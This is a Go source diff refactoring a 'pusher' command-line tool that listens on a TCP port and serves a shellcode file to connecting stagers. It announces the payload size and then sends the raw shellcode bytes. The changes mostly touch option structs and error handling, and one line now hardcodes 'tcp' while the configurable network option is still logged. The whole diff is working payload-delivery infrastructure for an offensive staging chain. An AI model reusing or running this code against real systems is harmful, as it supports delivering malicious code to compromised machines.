@@ -10,35 +10,42 @@ import (
 	"github.com/spf13/cobra"
 )
 
-var opts struct {
+// Opts holds the options for the pushed command
+type Opts struct {
 	address  string
 	net      string
 	fileName string
 }
 
+var pusherOpts Opts
+
 // PusherCmd contains the CLI interface for the pusher command.
 var PusherCmd = &cobra.Command{
 	Use:   "pusher",
 	Short: "pusher pushes shellcode to a stager",
-	Run:   runPusherServer,
+	RunE: func(cmd *cobra.Command, args []string) error {
+		return runPusherServer(pusherOpts)
+	},
 }
 
 func init() {
-	PusherCmd.PersistentFlags().StringVarP(&opts.address, "address", "a", ":5555", "listen address ([ip]:port)")
-	PusherCmd.PersistentFlags().StringVarP(&opts.net, "net", "n", "tcp", "dial network")
-	PusherCmd.PersistentFlags().StringVarP(&opts.fileName, "shellcode", "s", "", "file containing the shellcode")
+	PusherCmd.PersistentFlags().StringVarP(&pusherOpts.address, "address", "a", ":5555",
+		"listen address ([ip]:port)")
+	PusherCmd.PersistentFlags().StringVarP(&pusherOpts.net, "net", "n", "tcp", "dial network")
+	PusherCmd.PersistentFlags().StringVarP(&pusherOpts.fileName, "shellcode", "s", "",
+		"file containing the shellcode")
 
 	_ = PusherCmd.MarkPersistentFlagRequired("address")
 	_ = PusherCmd.MarkPersistentFlagRequired("shellcode")
 }
 
-func runPusherServer(cmd *cobra.Command, args []string) {
-	ln, err := net.Listen(opts.net, opts.address)
+func runPusherServer(opts Opts) error {
+	ln, err := net.Listen("tcp", opts.address)
 	if err != nil {
-		log.Fatalf("listen: %v\n", err)
+		return fmt.Errorf("listen: %w", err) // nolint:staticcheck
 	}
 
-	log.Printf("Listening on %s/%s\n", opts.address, opts.net)
+	log.Printf("Listening on %s/%s", opts.address, opts.net)
 
 	for {
 		conn, err := ln.Accept()
@@ -61,12 +68,14 @@ func serveShellcode(conn net.Conn, shellcode []byte) {
 
 	_, err := conn.Write(size)
 	if err != nil {
-		log.Fatalf("Error anouncing shellcode size: %v", err)
+		log.Printf("Error anouncing shellcode size: %v", err)
+		return
 	}
 
 	_, err = conn.Write(shellcode)
 	if err != nil {
-		log.Fatalf("Error sending shellcode: %v", err)
+		log.Printf("Error sending shellcode: %v", err)
+		return
 	}
 }
 
